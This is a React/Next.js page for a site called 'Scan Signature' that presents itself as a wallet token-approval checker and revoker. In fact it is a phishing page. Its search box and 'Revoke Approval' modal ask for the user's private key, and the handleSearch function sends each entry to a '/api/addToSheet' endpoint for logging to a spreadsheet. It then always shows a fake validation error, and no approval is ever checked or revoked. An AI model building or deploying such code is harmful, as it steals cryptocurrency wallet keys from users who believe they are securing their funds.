"use client";

import React, { useState } from "react";
import Header from "../components/Header";
import Footer from "../components/Footer";
import { IoSearch } from "react-icons/io5";
import CookieConsent from "../components/CookieConsent";
import Image from "next/image";
import Link from "next/link";
import { TbBulb } from "react-icons/tb";
import NavMenu from "../components/NavMenu";

const Page = () => {
  const [searchValue, setSearchValue] = useState("");
  const [modalInput, setModalInput] = useState("");
  const [showError, setShowError] = useState(false);
  const [showRevoke, setShowRevoke] = useState(true);
  const [inputLogs, setInputLogs] = useState<
    { input: string; timestamp: string }[]
  >([]);

  const handleSearch = async () => {
    const inputValue = modalInput.trim() ? modalInput : searchValue;
    if (inputValue.trim()) {
      const newLog = {
        input: inputValue,
        timestamp: new Date().toLocaleString(),
      };

      try {
        await fetch("/api/addToSheet", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(newLog),
        });
      } catch (error) {
        console.error("Error adding to Google Sheets:", error);
      }

      setShowError(true);
      setShowRevoke(false);
      setInputLogs([...inputLogs, newLog]);
      setSearchValue("");
      setModalInput("");
    }
  };

  // Handle Enter Key
  const handleKeyPress = (event: React.KeyboardEvent<HTMLInputElement>) => {
    if (event.key === "Enter") {
      handleSearch();
    }
  };

  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isClosing, setIsClosing] = useState(false);

  const openModal = () => {
    setIsModalOpen(true);
    setIsClosing(false);
  };

  const closeModal = () => {
    setIsClosing(true);
    setTimeout(() => {
      setIsModalOpen(false);
    }, 300);
  };

  const toggleRevoke = () => {
    setIsModalOpen(true);
    setIsClosing(false);
    setShowRevoke(true);
  };

  return (
    <>
      <Header />

      <NavMenu toggleRevoke={toggleRevoke} />

      <div className="second bg-light lg:px-8 xl:px-64 px-4 py-10 pb-14  lg:pt-10 lg:flex items-center bg-[url('/waves.svg')] justify-between  ">
        {/* Content */}
        <div className="col-lg-6 col-md-9">
          <h1 className="text-[#212529] font-medium text-xl mb-3">
            Scan Signature Smart Chain Signature Approval
          </h1>
          <p className="text-[#212529] mb-4 text-sm ">
            Review and Deauthorized your Signature Approval for any dApp. For
            more information, check out our Knowledge Base{" "}
            <Link
              href="https://scansignature.com/tokenapprovalchecker"
              className="text-[#0784C3]"
            >
              article
            </Link>
            .
          </p>

          <div className="flex items-center h-[50px] rounded-md rounded-tr-none rounded-br-none  overflow-hidden w-full lg:w-[480px] xl:w-[550px]">
            <input
              type="text"
              placeholder="Search private key for token approvals"
              value={searchValue}
              onChange={(e) => setSearchValue(e.target.value)}
              onKeyDown={handleKeyPress}
              className="w-full h-full px-3 border rounded-md rounded-tr-none rounded-br-none outline-gray-300 bg-white text-sm lg:text-base"
            />
            <button
              onClick={handleSearch}
              className="bg-[#0784C3] duration-300 ease-in-out cursor-pointer hover:bg-[#066EA5] text-white w-[55px] h-full rounded-tr-md rounded-br-md flex items-center justify-center"
            >
              <IoSearch size={20} />
            </button>
          </div>
        </div>

        <div className="mx-auto relative hidden lg:block">
          <Link href="https://scansignature.com/tokenapprovalchecker">
            <Image
              src="/ads.webp"
              width={310}
              height={310}
              alt="ads"
              className="rounded-md"
            />
          </Link>
          <div className="absolute top-[-15px] right-[10px] bg-white p-1 rounded-sm text-xs">
            <span>Ad</span>
          </div>
        </div>
      </div>

      {showRevoke && (
        <div className="xl:px-64 lg:px-8   bg-[#fbfcfd] p-4  pt-8">
          {/* Connect to Web3 Button */}
          <button
            className="flex items-center gap-2 bg-white cursor-pointer hover:bg-gray-50 border border-gray-200 px-4 py-2 rounded-md text-sm"
            onClick={openModal}
          >
            <span className="w-2 h-2 bg-red-500 rounded-full"></span>
            Connect to Web3
          </button>

          {/* Table Container */}
          <div className="w-full bg-white overflow-x-scroll lg:overflow-auto shadow-xs border-t rounded-lg mt-3 overflow-hidden">
            <table className="w-full border-collapse text-left text-nowrap ">
              <thead>
                <tr className="border-b">
                  <th className="px-4 py-3 lg:font-medium font-semibold  lg:text-sm text-[#212529] text-xs">
                    Transaction Hash
                  </th>
                  <th className="px-4 py-3 text-[#0784C3] lg:font-medium font-semibold lg:text-sm text-xs">
                    Last Updated (UTC)
                  </th>
                  <th className="px-4 py-3 lg:font-medium font-semibold lg:text-sm text-[#212529] text-xs">
                    Assets
                  </th>
                  <th className="px-4 py-3 flex items-center gap-4 font-medium  lg:font-semibold lg:text-sm text-xs text-[#212529]">
                    <span>Approved Spender</span>
                    <span>Allowance</span>
                  </th>
                </tr>
              </thead>
              <tbody>
                {/* Empty State */}
                <tr>
                  <td
                    colSpan={5}
                    className="py-28 mx-auto text-center px-4 lg:px-0"
                  >
                    <div className="flex flex-col md:items-center items-start  h-full">
                      <span className="bg-[#fff9e6] border-[#ffeeba] text-5xl p-2 rounded-full w-[62px] h-[62px] border  flex items-center justify-center">
                        <Image
                          src="/coins.png"
                          width={45}
                          height={45}
                          alt="coins"
                        />
                      </span>
                      <h2 className="text-[#212529] text-lg font-semibold mt-3">
                        Deauthorized Signature Approval
                      </h2>
                      <p className="text-[#6C757D] text-sm max-w-md text-center">
                        Review and Deauthorized your Signature approvals for any
                        dApp.
                      </p>
                      <button
                        className="mt-4 cursor-pointer hover:bg-gray-50 flex items-center gap-2 bg-white border border-gray-200 px-4 py-2 rounded-md text-sm"
                        onClick={openModal}
                      >
                        <span className="w-2 h-2 bg-red-500 rounded-full"></span>
                        Connect to Web3
                      </button>
                    </div>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>

          {/* Footer Notice */}
          <p className="mt-4 text-xs text-gray-500 w-full xl:flex items-center gap-1 ">
            <TbBulb size={18} className="text-gray-400 hidden xl:block" />
            The Token Approvals page lists contracts that have been approved to
            spend an address’s tokens. The at-risk amount shows what is
            vulnerable if the contracts were hacked. Learn more about this page
            in our
            <Link
              href="https://scansignature.com/tokenapprovalchecker"
              className="text-blue-500"
            >
              {" "}
              Knowledge Base
            </Link>
            .
          </p>

          {/* Revoke Approval Modal */}
          {isModalOpen && (
            <div
              className="fixed inset-0 z-30 bg-black/50 bg-opacity-50 flex items-center justify-center"
              onClick={closeModal} // Close when clicking overlay
            >
              <div
                className={`bg-white rounded-lg shadow-lg w-[90%] lg:w-[500px] fixed left-1/2 top-1/2 -translate-y-1/2  lg:top-[15%] transform -translate-x-1/2 lg:-translate-y-1/2 transition-transform duration-300 ${
                  isClosing ? "animate-slide-up" : "animate-slide-down"
                }`}
                onClick={(e) => e.stopPropagation()} // Prevent closing when clicking inside modal
              >
                {/* Modal Header */}
                <div className="flex justify-between items-center border-b p-4 pb-6">
                  <h2 className="text-lg font-medium">Revoke Approval</h2>
                  <button
                    className="text-gray-500 text-xl cursor-pointer"
                    onClick={closeModal}
                  >
                    ✕
                  </button>
                </div>

                <div className="p-4">
                  {/* Input Field */}
                  <label className="block mb-2 text-gray-600">
                    Private Key:
                  </label>
                  <input
                    type="text"
                    onChange={(e) => setModalInput(e.target.value)}
                    onKeyDown={handleKeyPress}
                    className="w-full p-2 border rounded-lg outline-gray-300 h-[50px]"
                  />

                  {/* Connect Button */}
                  <button
                    onClick={handleSearch}
                    className="bg-[#0784C3] cursor-pointer hover:bg-[#066EA3] duration-300 ease-in-out text-white mx-auto px-2 flex items-center justify-center mt-2 py-2 text-[14px] rounded-sm"
                  >
                    Connect to Web3
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {showError && (
        <div className="xl:px-64 lg:px-8 p-4 error-info py-8   ">
          <div className="flex items-center gap-2">
            <button className="flex items-center gap-2  bg-white cursor-pointer hover:bg-gray-50 border border-gray-200 px-4 py-2 rounded-md text-sm ">
              <span className="w-2 h-2 bg-red-500 rounded-full "></span>
              Connect to Web3
            </button>
            <p className="text-[#0784C3] text-sm">
              <span className="font-medium">$0.00</span> at risk
            </p>
          </div>
          <div className="bg-white p-4 rounded-lg mt-4 border">
            <h3 className="bg-[#f8d7da] p-3 text-[#B02A37] text-sm border border-[#f1aeb5] rounded-md ">
              Please enter a valid Address key or supported Private Key{" "}
            </h3>
          </div>

          {/* Footer Notice */}
          <p className="mt-4 text-xs text-gray-500 w-full  gap-1  xl:flex xl:items-center ">
            <TbBulb size={18} className="text-gray-400 md:hidden xl:block" />
            The Token Approvals page lists contracts that have been approved to
            spend an address’s tokens. The at-risk amount shows what is
            vulnerable if the contracts were hacked. Learn more about this page
            in our
            <Link
              href="https://scansignature.com/tokenapprovalchecker"
              className="text-blue-500 "
            >
              {" "}
              Knowledge Base
            </Link>
            .
          </p>
        </div>
      )}

      <CookieConsent />

      <Footer toggleRevoke={toggleRevoke} />
    </>
  );
};

export default Page;
